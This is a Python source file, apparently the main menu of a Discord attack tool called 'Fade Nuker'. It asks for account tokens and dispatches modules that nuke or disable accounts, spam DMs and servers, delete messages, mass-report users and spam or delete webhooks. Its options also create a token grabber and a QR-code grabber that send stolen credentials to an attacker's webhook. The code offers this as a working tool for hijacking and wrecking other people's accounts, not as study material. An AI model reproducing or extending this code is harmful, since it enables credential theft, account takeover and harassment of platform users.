import os, requests, threading, ctypes

from time import sleep
from colorama import Fore, Style, init

# I know you can import the modules alot better but just got so many issues with importing * so just did this instead
from util.plugins.common import clear, print_slow, setTitle, getheaders, THIS_VERSION
from util.plugins.update import search_for_updates
import util.accountNuke
import util.dmdeleter
import util.info
import util.login
import util.massreport
import util.QR_Grabber
import util.seizure
import util.server_leaver
import util.spamservers
import util.statuschanger
import util.tokendisable
import util.create_token_grabber
import util.unfriender
import util.webhookspammer
import util.massdm
init(convert=True)

def main():
    setTitle(f"Fade Nuker {THIS_VERSION}")
    global threads
    threads = 0
    clear()
    #Main banner
    banner = Style.BRIGHT + f'''{Fore.LIGHTRED_EX}
                                                                                                         _   _
                                                                                                       .-_; ;_-.
                                                                                                      / /     \ \\
                                                                                                     | |       | |
                                                                                                      \ \.---./ /
                                    ███████╗ █████╗ ██████╗ ███████╗                              .-"~   .---.   ~"-.
                                    ██╔════╝██╔══██╗██╔══██╗██╔════╝                            ,`.-~/ .'`---`'. \~-.`,
                                    █████╗  ███████║██║  ██║█████╗                               '`  | | \ _ / | |   `'
                                    ██╔══╝  ██╔══██║██║  ██║██╔══                              ,     \  \ | | /  /     ,
> Created by fishy#8271             ██║     ██║  ██║██████╔╝███████╗                            ;`'.,_\  `-'-'  /_,.'`;
> https://discord.gg/QzFwankYqc     ╚═╝     ╚═╝  ╚═╝╚═════╝ ╚══════╝                             '-._  _.-'^'-._  _.-'                                      '''.replace('█', f'{Fore.BLUE}█{Fore.RED}') + f'''   
{Fore.BLUE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RESET}[{Fore.RED}1{Fore.RESET}]{Fore.BLACK} Nuke Account                                |{Fore.RESET}[{Fore.RED}10{Fore.RESET}]{Fore.BLACK} Disable Account
{Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.BLACK} Unfriend all friends                        |{Fore.RESET}[{Fore.RED}11{Fore.RESET}]{Fore.BLACK} Status Changer
{Fore.RESET}[{Fore.RED}3{Fore.RESET}]{Fore.BLACK} Delete and leave all servers                |{Fore.RESET}[{Fore.RED}12{Fore.RESET}]{Fore.BLACK} Create Token Grabber 
{Fore.RESET}[{Fore.RED}4{Fore.RESET}]{Fore.BLACK} Spam Create New servers                     |{Fore.RESET}[{Fore.RED}13{Fore.RESET}]{Fore.BLACK} QR Code grabber 
{Fore.RESET}[{Fore.RED}5{Fore.RESET}]{Fore.BLACK} Dm Deleter                                  |{Fore.RESET}[{Fore.RED}14{Fore.RESET}]{Fore.BLACK} Mass Report
{Fore.RESET}[{Fore.RED}6{Fore.RESET}]{Fore.BLACK} Mass Dm                                     |{Fore.RESET}[{Fore.RED}15{Fore.RESET}]{Fore.BLACK} Webhook Destroyer
{Fore.RESET}[{Fore.RED}7{Fore.RESET}]{Fore.BLACK} Enable Seizure Mode                         |{Fore.RESET}[{Fore.RED}16{Fore.RESET}]{Fore.RED} Exit
{Fore.RESET}[{Fore.RED}8{Fore.RESET}]{Fore.BLACK} Get information from a targetted account    |
{Fore.RESET}[{Fore.RED}9{Fore.RESET}]{Fore.BLACK} Log into an account                         |
{Fore.BLUE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}'''
    print(banner)
    choice = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Choice: {Fore.LIGHTRED_EX}'))
    #all options 
    if choice == '1':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Server_Name = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Name of the servers that will be created: {Fore.LIGHTRED_EX}'))
        message_Content = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.accountNuke.Fade_Nuke, args=(token, Server_Name, message_Content)).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '2':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.unfriender.UnFriender, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '3':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.server_leaver.Leaver, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '4':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Server_Name = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Name of the servers that will be created: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.spamservers.SpamServers, args=(token, Server_Name)).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '5':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.dmdeleter.DmDeleter, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '6':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Message = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.massdm.MassDM, args=(token, Message)).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '7':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.seizure.Seizure, args=(token, )).start()
                return
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '8':
        token = str(input(
        f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        util.info.Info(token)

    elif choice == '9':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            threads = 100
            if threading.active_count() < threads:
                threading.Thread(target=util.login.TokenLogin, args=(token, )).start()
                return                
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '10':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            util.tokendisable.TokenDisable(token)
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '11':
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        Status = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Custom Status: {Fore.LIGHTRED_EX}'))
        r = requests.get(
            'https://discord.com/api/v6/users/@me',
            headers=getheaders(token))
        if r.status_code == 200:
            clear()
            util.statuschanger.StatusChanger(token, Status)
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '12':
        WebHook = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}WebHook Url: {Fore.LIGHTRED_EX}'))
        fileName = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}File name: {Fore.LIGHTRED_EX}'))
        try:
            responce = requests.get(
                WebHook)
            if responce.status_code != 200:
                print("\nInvalid Webhook")
                sleep(1)
                main()
        except Exception as e:
            print(f"an error occured\nignoring: {e}")
            sleep(4)
            main()
        util.create_token_grabber.TokenGrabber(WebHook, fileName)


    elif choice == '13':
        WebHook = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}WebHook Url: {Fore.LIGHTRED_EX}'))
            
        try:
            responce = requests.get(
                WebHook)
            if responce.status_code != 200:
                print("\nInvalid Webhook")
                sleep(1)
                main()
        except Exception as e:
            print(f"an error occured\nignoring: {e}")
            sleep(4)
            main()
        util.QR_Grabber.QR_Grabber(WebHook)


    elif choice == '14':
        print(f"\n{Fore.LIGHTRED_EX}(the token you input is the account that will send the reports){Fore.RESET}")
        token = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))
        guild_id1 = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Server ID: {Fore.LIGHTRED_EX}'))
        channel_id1 = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Channel ID: {Fore.LIGHTRED_EX}'))
        message_id1 = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Message ID: {Fore.LIGHTRED_EX}'))
        reason1 = str(input(
            '\n[1] Illegal content\n'
            '[2] Harassment\n'
            '[3] Spam or phishing links\n'
            '[4] Self-harm\n'
            '[5] NSFW content\n\n'

            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Reason: {Fore.LIGHTRED_EX}'))
        if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARASSMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason1 = 2
        elif reason1.upper() in ('4', 'SELF-HARM'):
            reason1 = 3
        elif reason1.upper() in ('5', 'NSFW CONTENT'):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
            main()
        try:
            Amount = int(input(
                f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Amount of reports: {Fore.LIGHTRED_EX}'))
        except:
            pass
            print(f'\n{Fore.RED}Invalid Amount of reports.{Fore.RESET}')
            sleep(1)
            main()
        r = requests.get('https://discord.com/api/v6/users/@me',headers=getheaders(token))
        if r.status_code == 200:
            clear()
            util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1, Amount)
        else:
            print(f"\n{Fore.RED}Invalid Token.{Fore.RESET}")
            sleep(1)
            main()


    elif choice == '15':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                        ''')
        secondchoice = int(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Second Choice: {Fore.LIGHTRED_EX}'))

        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')
            sleep(1)
            main()

        if secondchoice == 1:
            WebHook = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Webhook: {Fore.LIGHTRED_EX}'))
            try:
                responce = requests.get(
                    WebHook)
                if responce.status_code != 200:
                    print("\nInvalid Webhook")
                    sleep(1)
                    main()
            except Exception as e:
                print(f"an error occured\nignoring: {e}")
                sleep(4)
                main()

            try:
                requests.delete(WebHook)
                print(f'\n{Fore.RED}Webhook Succesfully Deleted!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Error: {Fore.BLUE}{e} {Fore.RED}happend while trying to delete the Webhook')
            choice = str(input(
                f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Enter anything to continue. . . {Fore.LIGHTRED_EX}'))
            main()

        if secondchoice == 2:
            WebHook = str(input(
                f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Webhook: {Fore.LIGHTRED_EX}'))
            Message = str(input(
                f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Message: {Fore.LIGHTRED_EX}'))
            Timer = str(input(
                f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Amount of time for the spam (sec): {Fore.LIGHTRED_EX}'))
            try:
                responce = requests.get(
                    WebHook)
                if responce.status_code != 200:
                    print("\nInvalid Webhook")
                    sleep(1)
                    main()
            except Exception as e:
                print(f"an error occured\nignoring: {e}")
                sleep(4)
                main()
            util.webhookspammer.WebhookSpammer(WebHook, Message, Timer)
            

    elif choice == '16':
        setTitle("Exiting...")
        choice = str(input(
            f'{Fore.RED}[{Fore.CYAN}>>>{Fore.RED}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))
        if choice.upper() == 'Y':
            clear()
            Style.RESET_ALL
            Fore.RESET
            os._exit(0)
        else:
            main()
    else:
        clear()
        main()

if __name__ == "__main__":
    search_for_updates()
    main()